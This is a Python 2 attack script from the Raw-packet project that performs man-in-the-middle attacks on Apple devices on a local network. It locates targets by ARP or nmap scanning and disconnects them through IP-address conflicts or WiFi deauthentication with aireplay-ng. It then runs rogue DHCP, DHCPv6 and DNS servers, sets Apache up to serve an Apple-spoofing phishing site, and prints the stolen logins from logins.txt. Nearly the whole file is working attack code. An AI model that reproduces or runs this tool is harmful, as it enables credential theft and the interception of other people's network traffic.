#!/usr/bin/env python
# -*- coding: utf-8 -*-

# region Description
"""
apple_dhcp_mitm.py: MiTM Apple devices in local network
Author: Vladimir Ivanov
License: MIT
Copyright 2019, Raw-packet Project
"""
# endregion

# region Import

# region Add project root path
from sys import path
from os.path import dirname, abspath
path.append(dirname(dirname(dirname(abspath(__file__)))))
# endregion

# region Raw-packet modules
from raw_packet.Utils.base import Base
from raw_packet.Scanners.scanner import Scanner
from raw_packet.Scanners.arp_scanner import ArpScan
from raw_packet.Utils.tm import ThreadManager
from raw_packet.Utils.network import Sniff_raw, ARP_raw
# endregion

# region Import libraries
from os import path, errno, makedirs, stat
from shutil import copyfile, copytree
import subprocess as sub
from argparse import ArgumentParser
from sys import exit, stdout
from time import sleep
from ipaddress import IPv4Address
from socket import socket, AF_PACKET, SOCK_RAW
from random import randint
import re
from os.path import dirname, abspath
project_root_path = dirname(dirname(dirname(abspath(__file__))))
# endregion

# endregion

# region Authorship information
__author__ = 'Vladimir Ivanov'
__copyright__ = 'Copyright 2019, Raw-packet Project'
__credits__ = ['']
__license__ = 'MIT'
__version__ = '0.0.4'
__maintainer__ = 'Vladimir Ivanov'
__email__ = 'ivanov.vladimir.mail@gmail.com'
__status__ = 'Development'
# endregion

# region Check user, platform and print banner
Base = Base()
Scanner = Scanner()
ArpScan = ArpScan()
Base.check_user()
Base.check_platform()
Base.print_banner()
# endregion

# region Parse script arguments
parser = ArgumentParser(description='MiTM Apple devices in local network')

parser.add_argument('-l', '--listen_iface', type=str, help='Set interface name for send DHCPACK packets')
parser.add_argument('-d', '--deauth_iface', type=str, help='Set interface name for send wifi deauth packets')
parser.add_argument('-D', '--phishing_domain', type=str, default="auth.apple.wi-fi.com",
                    help='Set domain name for social engineering (default="auth.apple.wi-fi.com")')
parser.add_argument('-p', '--phishing_domain_path', type=str, default="apple",
                    help='Set local path to domain name for social engineering (default="apple")')

parser.add_argument('-t', '--target_ip', type=str, help='Set target IP address', default=None)
parser.add_argument('-n', '--new_ip', type=str, help='Set new IP address for target', default=None)
parser.add_argument('-s', '--nmap_scan', action='store_true', help='Use nmap for Apple device detection')

parser.add_argument('--kill', action='store_true', help='Kill all processes and threads')
parser.add_argument('--deauth', action='store_true', help='Use WiFi deauth technique for disconnect Apple device')

parser.add_argument('--ipv6', action='store_true', help='Use IPv6 MiTM')
parser.add_argument('--ipv6_prefix', type=str, help='Set network prefix', default='fd00::/64')

args = parser.parse_args()
# endregion

# region Check parameters --ipv6 and --deauth
if args.ipv6:
    if args.deauth_iface is None:
        if not args.deauth:
            Base.print_error("IPv6 MiTM technique works only with WiFi deauth technique: `--deauth`")
            exit(1)
# endregion

# region Kill subprocesses

# Kill subprocesses
Base.kill_process_by_name('apple_rogue_dhcp')
Base.kill_process_by_name('dhcp_rogue_server')
Base.kill_process_by_name('dns_server.py')
Base.kill_process_by_name('aireplay-ng')

try:
    Base.print_info("Stop services ...")
    sub.Popen(['service dnsmasq stop  >/dev/null 2>&1'], shell=True)
    sub.Popen(['service network-manager stop  >/dev/null 2>&1'], shell=True)
except OSError as e:
    if e.errno == errno.ENOENT:
        Base.print_error("Program: ", "service", " is not installed!")
        exit(1)
    else:
        Base.print_error("Something went wrong while trying to run ", "`service ...`")
        exit(2)

# Kill the processes that listens on 53, 68, 547 UDP port, 80 and 443 TCP ports
Base.kill_process_by_listen_port(53, 'udp')
Base.kill_process_by_listen_port(68, 'udp')
Base.kill_process_by_listen_port(547, 'udp')
Base.kill_process_by_listen_port(80, 'tcp')
Base.kill_process_by_listen_port(443, 'tcp')

# Exit
if args.kill:
    exit(0)

# endregion

# region Set global variables
raw_socket = None
arp = ARP_raw()

deauth_network_interface = None

apple_devices = []
apple_device = []
localnet_ip_addresses = []
ip_pattern = re.compile("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")
target_ip = None
new_ip = None

bssid = None
essid = None
channel = None
freq = None

sniff_dhcp_request = False

your_local_ipv6_address = None
network_prefix = None
network_prefix_address = None
network_prefix_length = None
first_suffix = 2
last_suffix = 255
# endregion

# region Get listen network interface, your IP address, first and last IP in local network
if args.listen_iface is None:
    Base.print_warning("Please set a network interface for sniffing ARP and DHCP requests ...")
listen_network_interface = Base.netiface_selection(args.listen_iface)

your_mac_address = Base.get_netiface_mac_address(listen_network_interface)
if your_mac_address is None:
    Base.print_error("Network interface: ", listen_network_interface, " does not have MAC address!")
    exit(1)

your_ip_address = Base.get_netiface_ip_address(listen_network_interface)
if your_ip_address is None:
    Base.print_error("Network interface: ", listen_network_interface, " does not have IP address!")
    exit(1)

if args.ipv6:
    your_local_ipv6_address = Base.get_netiface_ipv6_link_address(listen_network_interface)
    if your_local_ipv6_address is None:
        print Base.c_error + "Network interface: " + listen_network_interface + " do not have IPv6 link local address!"
        exit(1)

    network_prefix = args.ipv6_prefix
    network_prefix_address = network_prefix.split('/')[0]
    network_prefix_length = network_prefix.split('/')[1]

first_ip = Base.get_netiface_first_ip(listen_network_interface)
last_ip = Base.get_netiface_last_ip(listen_network_interface)
# endregion

# region Get network interface for send wifi deauth packets, get wifi settings from listen network interface
if args.deauth_iface is not None:
    args.deauth = True

if args.deauth:
    # region Get network interface for send wifi deauth packets
    if args.deauth_iface is None:
        Base.print_warning("Please set network interface for send WiFi deauth packets ...")
    deauth_network_interface = Base.netiface_selection(args.deauth_iface)

    if listen_network_interface == deauth_network_interface:
        Base.print_error("Network interface for listening DHCP requests (", listen_network_interface,
                         ") and network interface for send WiFi deauth packets must be differ!")
        exit(1)
    # endregion

    # region Get wifi settings from listen network interface
    try:
        iwgetid = sub.Popen(['iwgetid -r ' + listen_network_interface], shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
        essid, essid_err = iwgetid.communicate()
        iwgetid = sub.Popen(['iwgetid -a -r ' + listen_network_interface], shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
        bssid, bssid_err = iwgetid.communicate()
        iwgetid = sub.Popen(['iwgetid -c -r ' + listen_network_interface], shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
        channel, channel_err = iwgetid.communicate()
        iwgetid = sub.Popen(['iwgetid -f -r ' + listen_network_interface], shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
        freq, freq_err = iwgetid.communicate()

        essid = essid.rstrip()
        bssid = bssid.rstrip()
        channel = channel.rstrip()
        freq = freq.rstrip()

        if essid is None or essid == "":
            Base.print_error("Network interface: ", listen_network_interface, " is not connected to WiFi AP!")
            exit(1)
    except OSError as e:
        if e.errno == errno.ENOENT:
            Base.print_error("Program: iwgetid is not installed!")
            exit(1)
        else:
            Base.print_error("Something else went wrong while trying to run `iwgetid`")
            exit(2)
    # endregion

# endregion

# region General output
Base.print_info("Listen network interface: ", listen_network_interface)

if not args.ipv6:
    Base.print_info("Your IP address: ", your_ip_address)
    Base.print_info("First ip address: ", first_ip)
    Base.print_info("Last ip address: ", last_ip)
else:
    Base.print_info("Your IPv6 local address: ", your_local_ipv6_address)
    Base.print_info("Prefix: ", network_prefix)
    Base.print_info("Router IPv6 address: ", your_local_ipv6_address)
    Base.print_info("DNS IPv6 address: ", your_local_ipv6_address)
    Base.print_info("First advertise IPv6 address: ", network_prefix_address + hex(first_suffix))
    Base.print_info("Last advertise IPv6 address: ", network_prefix_address + hex(last_suffix))

if args.deauth:
    Base.print_info("Interface ", listen_network_interface, " connect to: ", essid + " (" + bssid + ")")
    Base.print_info("Interface ", listen_network_interface, " channel: ", channel)
    Base.print_info("Interface ", listen_network_interface, " frequency: ", freq)
    Base.print_info("Deauth network interface: ", deauth_network_interface)
# endregion

# region Check target IP and new IP addresses
if args.target_ip is not None:
    if ip_pattern.match(args.target_ip):
        if IPv4Address(unicode(first_ip)) <= IPv4Address(unicode(args.target_ip)) <= IPv4Address(unicode(last_ip)):
            target_ip = args.target_ip
            Base.print_info("Target IP address: ", target_ip)
        else:
            Base.print_error("Target IP address: ", args.target_ip, " not in range: ", first_ip + " ... " + last_ip)
            exit(1)
    else:
        Base.print_error("Wrong target IP address: ", args.target_ip)
        exit(1)

if args.new_ip is not None:
    if ip_pattern.match(args.new_ip):
        if IPv4Address(unicode(first_ip)) <= IPv4Address(unicode(args.new_ip)) <= IPv4Address(unicode(last_ip)):
            new_ip = args.new_ip
            Base.print_info("Target new IP address: ", new_ip)
        else:
            Base.print_error("Target new IP address: ", args.new_ip, " not in range: ", first_ip + " ... " + last_ip)
            exit(1)
    else:
        Base.print_error("Wrong target new IP address: ", args.new_ip)
        exit(1)
# endregion


# region DHCP Request sniffer PRN function
def dhcp_request_sniffer_prn(request):
    
    # region Global variables
    global sniff_dhcp_request
    global Base
    global args
    global arp
    global raw_socket
    # endregion

    # region Local variables
    requested_ipv4_address = None
    # endregion

    # region Stop aireplay-ng
    if 'ARP' or 'ICMPv6' or 'DHCP' or 'DHCPv6' or 'DNS' in request.keys():
        sniff_dhcp_request = True
        Base.kill_process_by_name('aireplay-ng')
    # endregion

    # region IPv6
    if args.ipv6:
        if 'ARP' in request.keys():
            if request['ARP']['opcode'] == 1:
                if request['Ethernet']['destination'] == "ff:ff:ff:ff:ff:ff":
                    if request['ARP']['sender-ip'] == request['ARP']['target-ip']:
                        arp_reply = arp.make_response(ethernet_src_mac=your_mac_address,
                                                      ethernet_dst_mac=request['ARP']['sender-mac'],
                                                      sender_mac=your_mac_address,
                                                      sender_ip=request['ARP']['target-ip'],
                                                      target_mac=request['ARP']['sender-mac'],
                                                      target_ip=request['ARP']['sender-ip'])
                        raw_socket.send(arp_reply)
    # endregion

# endregion


# region DHCP or DHCPv6 Request sniffer function
def dhcp_request_sniffer():

    # region Set network filter
    network_filters = {'Ethernet': {'source': target_mac_address}}
    # endregion

    # region Start sniffer
    sniff = Sniff_raw()

    global raw_socket
    raw_socket = socket(AF_PACKET, SOCK_RAW)
    raw_socket.bind((listen_network_interface, 0))

    sniff.start(protocols=['IP', 'IPv6', 'ICMPv6', 'ARP', 'UDP', 'DNS', 'DHCP', 'DHCPv6'],
                prn=dhcp_request_sniffer_prn, filters=network_filters)
    # endregion

# endregion


# region WiFi deauth packets sender
def deauth_packets_send():

    # Start DHCP or ARP requests sniffer function
    tm = ThreadManager(2)
    tm.add_task(dhcp_request_sniffer)
    sleep(3)

    # Set WiFi channel on interface for send WiFi deauth packets
    sub.Popen(['iwconfig ' + deauth_network_interface + ' channel ' + channel], shell=True)
    Base.print_info("Send WiFi deauth packets ...")

    # Start deauth packets numbers = 3
    deauth_packets_number = 3

    while not sniff_dhcp_request:

        # Start aireplay-ng process
        try:
            aireplay_process = sub.Popen(['aireplay-ng ' + deauth_network_interface +
                                          ' -0 ' + str(deauth_packets_number) + ' -a ' + bssid +
                                          ' -c ' + target_mac_address], shell=True, stdout=sub.PIPE)
            while True:
                output = aireplay_process.stdout.readline()
                if output == '' and aireplay_process.poll() is not None:
                    break
                if output:
                    stdout.write(re.sub(r'(\d\d:\d\d:\d\d  (Waiting|Sending))', Base.c_info + r'\g<1>', output))

        except OSError as e:
            if e.errno == errno.ENOENT:
                Base.print_error("Program: ", "aireply-ng", " is not installed!")
                exit(1)
            else:
                Base.print_error("Something else went wrong while trying to run ", "`aireply-ng`")
                exit(2)

        # Wait before sniff ARP or DHCP request packet
        sleep(5)

        # Add 5 packets to number of WiFi deauth packets
        if deauth_packets_number < 30:
            deauth_packets_number += 5

# endregion


# region Main function
if __name__ == "__main__":

    # region Set monitor mode on network interface for send wifi deauth packets
    if args.deauth:
        Base.print_info("Set Monitor mode on interface: ", deauth_network_interface, " ...")
        try:
            sub.Popen(['ifconfig ' + deauth_network_interface + ' down'], shell=True, stdout=sub.PIPE)
            sub.Popen(['iwconfig ' + deauth_network_interface + ' mode monitor >/dev/null 2>&1'],
                      shell=True, stdout=sub.PIPE)

            sleep(3)
            wireless_settings = sub.Popen(['iwconfig ' + deauth_network_interface],
                                          shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
            wireless_settings_out, wireless_settings_error = wireless_settings.communicate()

            if wireless_settings_out.find("Mode:Monitor") == -1:
                if wireless_settings_out.find("Mode:Auto") == -1:
                    Base.print_error("Could not set Monitor mode on interface: ", deauth_network_interface)
                    exit(1)

            sub.Popen(['ifconfig ' + deauth_network_interface + ' up'], shell=True, stdout=sub.PIPE)
        except OSError as e:
            if e.errno == errno.ENOENT:
                Base.print_error("Program: iwconfig or ifconfig is not installed!")
                exit(1)
            else:
                Base.print_error("Something else went wrong while trying to run `iwconfig` or `ifconfig`")
                exit(2)
    # endregion

    # region Social engineering

    # region Disable ipv4 forwarding
    Base.print_info("Disable ipv4 forwarding")
    ipv4_forward_file_name = "/proc/sys/net/ipv4/ip_forward"
    with open(ipv4_forward_file_name, 'w') as ipv4_forward_file:
        ipv4_forward_file.write("0")
    # endregion

    # region Check OS installed software
    Base.print_info("Check OS installed software")
    Base.check_installed_software("apache2")
    Base.check_installed_software("service")
    Base.check_installed_software("ps")
    # endregion

    # region Variables
    script_dir = project_root_path
    apache2_sites_available_dir = "/etc/apache2/sites-available/"
    apache2_sites_enabled_dir = "/etc/apache2/sites-enabled/"
    apache2_sites_path = "/var/www/html/"
    redirect_path = apache2_sites_path + "redirect/"
    # endregion

    # region Set phishing domain and path
    se_domain = args.phishing_domain
    if args.phishing_domain_path == "google" or "apple" or "microsoft":
        se_path = apache2_sites_path + args.phishing_domain_path
    else:
        se_path = args.phishing_domain_path

    Base.print_info("Phishing domain: ", se_domain)
    Base.print_info("Phishing domain local path: ", se_path)
    # endregion

    # region Directory for phishing domain
    if not path.exists(se_path):
        if args.phishing_domain_path == "google" or "apple" or "microsoft":
            copytree(src=project_root_path + "/Utils/Phishing_domains/" + args.phishing_domain_path, dst=se_path)
        else:
            Base.print_error("Directory: ", se_path, " does not exist!")
            exit(1)

    credentials_file_name = se_path + '/logins.txt'
    sub.Popen(['chmod 777 ' + credentials_file_name + ' >/dev/null 2>&1'], shell=True)
    # endregion

    # region Apache2 sites settings
    default_site_file_name = "000-default.conf"
    default_site_file = open(apache2_sites_available_dir + default_site_file_name, 'w')
    default_site_file.write("<VirtualHost *:80>\n" +
                            "\tServerAdmin admin@apple.com\n" +
                            "\tRewriteEngine on\n" +
                            "\tRewriteCond %{REQUEST_FILENAME} !-f\n" +
                            "\tRewriteCond %{REQUEST_FILENAME} !-d\n" +
                            "\tRewriteRule ^(.*)$ /redirect.php?page=$1 [NC]\n" +
                            "\tDocumentRoot " + redirect_path + "\n" +
                            "\t<Directory " + redirect_path + ">\n" +
                            "\t\tOptions FollowSymLinks\n" +
                            "\t\tAllowOverride None\n" +
                            "\t\tOrder allow,deny\n" +
                            "\t\tAllow from all\n" +
                            "\t</Directory>\n" +
                            "</VirtualHost>\n\n" +
                            "<VirtualHost *:80>\n" +
                            "\tServerName " + se_domain + "\n" +
                            "\tServerAdmin admin@" + se_domain + "\n" +
                            "\tDocumentRoot " + se_path + "\n" +
                            "\t<Directory " + se_path + ">\n" +
                            "\t\tOptions FollowSymLinks\n" +
                            "\t\tAllowOverride None\n" +
                            "\t\tOrder allow,deny\n" +
                            "\t\tAllow from all\n" +
                            "\t</Directory>\n" +
                            "</VirtualHost>\n")
    default_site_file.close()

    # Create dir with redirect script
    try:
        makedirs(redirect_path)
    except OSError:
        Base.print_info("Path: ", redirect_path, " already exist")
    except:
        Base.print_error("Something else went wrong while trying to create path: ", redirect_path)
        exit(1)

    # Copy and change redirect script
    redirect_script_name = "redirect.php"
    redirect_script_src = script_dir + "/Utils/" + redirect_script_name
    redirect_script_dst = redirect_path + redirect_script_name

    copyfile(src=redirect_script_src, dst=redirect_script_dst)

    # Read redirect script
    with open(redirect_script_dst, 'r') as redirect_script:
        content = redirect_script.read()

    # Replace the string
    content = content.replace('se_domain', se_domain)
    content = content.replace('se_path', se_path)

    # Write redirect script
    with open(redirect_script_dst, 'w') as redirect_script:
        redirect_script.write(content)

    try:
        Base.print_info("Restarting apache2 server ...")
        sub.Popen(['a2enmod rewrite  >/dev/null 2>&1'], shell=True)
        sub.Popen(['service apache2 restart  >/dev/null 2>&1'], shell=True)
    except OSError as e:
        if e.errno == errno.ENOENT:
            Base.print_error("Program: ", "service", " is not installed!")
            exit(1)
        else:
            Base.print_error("Something went wrong while trying to run ", "`service apache2 restart`")
            exit(2)
    # endregion

    # region Check apache2 is running
    sleep(2)
    apache2_pid = Base.get_process_pid("apache2")
    if apache2_pid == -1:
        Base.print_error("Apache2 server is not running!")
        exit(1)
    else:
        Base.print_info("Apache2 server is running, PID: ", str(apache2_pid))
    # endregion

    # region DNS server settings
    Base.print_info("Start DNS server ...")
    try:
        # Use IPv6
        if args.ipv6:
            sub.Popen(['python ' + script_dir + '/Scripts/DNS/dns_server.py -i ' +
                       listen_network_interface + ' --ipv6 -f -q'], shell=True)

        # Do not use IPv6
        else:
            sub.Popen(['python ' + script_dir + '/Scripts/DNS/dns_server.py -i ' +
                       listen_network_interface + ' -f -q'], shell=True)

    except OSError as e:
        if e.errno == errno.ENOENT:
            Base.print_error("Program: ", "python", " is not installed!")
            exit(1)
        else:
            Base.print_error("Something else went wrong while trying to run ", "`dns_server.py`")
            exit(2)
    # endregion

    # region Check DNS server is running
    sleep(5)
    dns_pid = Base.get_process_pid("dns_server.py")
    if dns_pid == -1:
        Base.print_error("DNS server is not running!")
        exit(1)
    else:
        Base.print_info("DNS server is running, PID: ", str(dns_pid))
    # endregion

    # endregion

    # region Find Apple devices in local network with ArpScan or nmap
    if args.target_ip is None:
        if not args.nmap_scan:
            Base.print_info("ARP scan is running ...")
            apple_devices = Scanner.find_apple_devices_by_mac(listen_network_interface)
        else:
            Base.print_info("NMAP scan is running ...")
            apple_devices = Scanner.find_apple_devices_with_nmap(listen_network_interface)

        apple_device = Scanner.apple_device_selection(apple_devices)
    # endregion

    # region Find Mac address of Apple device if target IP is set
    if args.target_ip is not None:
        Base.print_info("Search MAC address of Apple device with IP address: ", target_ip, " ...")
        target_mac = ArpScan.get_mac_address(listen_network_interface, target_ip)
        if target_mac == "ff:ff:ff:ff:ff:ff":
            Base.print_error("Could not find device MAC address with IP address: ", target_ip)
            exit(1)
        else:
            apple_device = [target_ip, target_mac]
    # endregion

    # region Apple devices are found

    if len(apple_device) > 0:

        # region Output target IP and MAC address
        target_ip_address = apple_device[0]
        target_mac_address = apple_device[1]
        Base.print_info("Target: ", target_ip_address + " (" + target_mac_address + ")")
        # endregion

        # region Set new IP address for target
        if not args.deauth:
            if args.new_ip is None:

                # region Fast scan localnet with ArpScan
                Base.print_info("Search for free IP addresses on the local network ...")
                localnet_ip_addresses = Scanner.find_ip_in_local_network(listen_network_interface)
                # endregion

                index = 0
                while new_ip is None:
                    check_ip = str(IPv4Address(unicode(first_ip)) + index)
                    if check_ip not in localnet_ip_addresses:
                        new_ip = check_ip
                    else:
                        index += 1
                index = 0

            Base.print_info("Target new IP address: ", new_ip)

        if args.ipv6:
            new_ip = network_prefix_address + format(randint(1, 65535), 'x')
            Base.print_info("Target new IPv6 address: ", new_ip)
        # endregion

        # region IPv4 address conflict technique
        if not args.deauth:
            try:
                # Start DHCP rogue server for Apple device
                sub.Popen(['python ' + script_dir + '/Scripts/Apple/apple_rogue_dhcp.py -i ' +
                           listen_network_interface + ' -t ' + target_mac_address +
                           ' -I ' + new_ip + ' -q &'],
                          shell=True)

                # Wait 3 seconds
                sleep(3)

                # Start network_conflict_creator.py script
                sub.Popen(['python ' + script_dir + '/Scripts/Others/network_conflict_creator.py -i ' +
                           listen_network_interface + ' -t ' + target_ip_address +
                           ' -m ' + target_mac_address + ' -q'], shell=True)

            # Exceptions
            except OSError as e:
                if e.errno == errno.ENOENT:
                    Base.print_error("Program: ", "python", " is not installed!")
                    exit(1)
                else:
                    Base.print_error("Something else went wrong while trying to run ",
                                     "`apple_rogue_dhcp.py`", " or ", "`network_conflict_creator.py`")
                    exit(2)
        # endregion

        # region Wifi deauth technique
        if args.deauth:
            try:
                if args.ipv6:
                    # Start DHCPv6 rogue server
                    sub.Popen(['python ' + script_dir + '/Scripts/DHCP/dhcpv6_rogue_server.py -i ' +
                               listen_network_interface + ' -t ' + target_mac_address +
                               ' -T ' + new_ip + ' -p ' + network_prefix + ' -q &'],
                              shell=True)

                else:
                    # Start DHCP rogue server
                    sub.Popen(['python ' + script_dir + '/Scripts/DHCP/dhcp_rogue_server.py -i ' +
                               listen_network_interface + ' -t ' + target_mac_address + ' -T ' + target_ip_address +
                               ' --dnsop --exit --quiet &'],
                              shell=True)

                # Wait 3 seconds
                sleep(3)

            # Exceptions
            except OSError as e:
                if e.errno == errno.ENOENT:
                    Base.print_error("Program: ", "python", " is not installed!")
                    exit(1)
                else:
                    Base.print_error("Something else went wrong while trying to run ", "`dhcp_rogue_server.py`")
                    exit(2)

            # Send wifi deauth packets
            deauth_packets_send()

        # endregion

        # region Check credentials

        # Get credentials file size
        credentials_file_size = stat(credentials_file_name).st_size

        try:
            while True:
                # Credentials file has changed
                if stat(credentials_file_name).st_size > credentials_file_size:

                    # Read credentials file
                    credentials_file_descriptor = open(credentials_file_name, 'r')
                    credentials_file_descriptor.seek(credentials_file_size)
                    try:
                        for credentials in credentials_file_descriptor.readlines():
                            credentials_list = credentials.split(' ')
                            Base.print_success("Phishing success: ", credentials_list[0],
                                               " credentials: ", credentials_list[1], " ", credentials_list[2][:-1])
                    except IndexError:
                        pass
                    credentials_file_descriptor.close()

                    # Rewrite credentials file size
                    credentials_file_size = stat(credentials_file_name).st_size

                # Wait
                sleep(1)

        except KeyboardInterrupt:

            # Print info message
            Base.print_info("Exit ...")

            # Kill subprocess
            Base.kill_process_by_name('apple_rogue_dhcp')
            Base.kill_process_by_name('dhcp_rogue_server')
            Base.kill_process_by_name('dns_server.py')
            Base.kill_process_by_name('aireplay-ng')

            # Exit from Main function
            exit(0)

        # endregion

    # endregion

# endregion
